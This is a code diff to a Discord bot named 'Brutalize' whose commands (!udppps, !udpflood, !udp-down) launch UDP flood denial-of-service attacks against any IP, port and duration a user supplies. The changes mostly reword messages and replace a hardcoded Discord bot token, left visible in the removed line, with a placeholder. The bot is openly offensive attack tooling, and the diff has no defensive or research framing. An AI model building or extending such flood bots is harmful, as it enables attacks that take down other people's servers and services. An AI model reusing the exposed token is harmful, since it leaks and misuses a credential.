@@ -154,7 +154,7 @@ class Brutalize:
 async def udppps(ctx, ip: str, port: int, tiempo: int):
     global attack_in_progress, last_attack_time, current_attack_stop_event
     if attack_in_progress:
-        await ctx.send("Attack are is Running Stop with cmd: !stop")
+        await ctx.send("Attack Is Running Stop With Cmd: !stop")
         return
     if time.time() - last_attack_time < cooldown_seconds:
         await ctx.send(f"Debes esperar {int(cooldown_seconds - (time.time() - last_attack_time))} segundos antes de lanzar otro ataque")
@@ -177,7 +177,7 @@ async def udppps(ctx, ip: str, port: int, tiempo: int):
 @udppps.error
 async def udppps_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Using: `!udppps <ip> <port> <time>`")
+        await ctx.send("Using: `!udppps <IP> <Port> <Time>`")
     else:
         await ctx.send(f"❌Error: {error}❌")
 
@@ -214,7 +214,7 @@ def udp_flood_attack(ip, port, duration, amplifier, stop_event):
 async def udpflood(ctx, ip: str, port: int, tiempo: int):
     global attack_in_progress, last_attack_time, current_attack_stop_event
     if attack_in_progress:
-        await ctx.send("Attack are is Running Stop with cmd: !stop")
+        await ctx.send("Attack Is Running Stop With Cmd: !stop")
         return
     if time.time() - last_attack_time < cooldown_seconds:
         await ctx.send(f"Remaining {int(cooldown_seconds - (time.time() - last_attack_time))} Something Others")
@@ -236,7 +236,7 @@ async def udpflood(ctx, ip: str, port: int, tiempo: int):
 @udpflood.error
 async def udpflood_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Using: `!udpflood <ip> <port> <time>`")
+        await ctx.send("Using: `!udpflood <IP> <Port> <Time>`")
     else:
         await ctx.send(f"❌Error: {error}❌")
 
@@ -248,7 +248,7 @@ async def udp_down(ctx, ip: str, port: int, tiempo: int):
         await ctx.send("Attack are is Running Stop with cmd: !stop")
         return
     if time.time() - last_attack_time < cooldown_seconds:
-        await ctx.send(f"Remaining {int(cooldown_seconds - (time.time() - last_attack_time))} Something Others!")
+        await ctx.send(f"Please WAIT! {int(cooldown_seconds - (time.time() - last_attack_time))} Time")
         return
     attack_in_progress = True
     current_attack_stop_event = threading.Event()
@@ -275,7 +275,7 @@ async def udp_down(ctx, ip: str, port: int, tiempo: int):
 @udp_down.error
 async def udp_down_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send("Using: `!udp-down <ip> <port> <time>`")
+        await ctx.send("Using: `!udp-down <IP> <Port> <time>`")
     else:
         await ctx.send(f"❌Error: {error}❌")
 
@@ -289,4 +289,4 @@ async def stop(ctx):
     else:
         await ctx.send("❌No Running Attacks!❌")
 
-bot.run('MTQ2NjI0MjkwNzY0NzM3NzQ5MQ.GUFXzx.u7_2MCq6g1GlaH64T9oPb7lMm4_95pue5FTooQ')
+bot.run('Token')
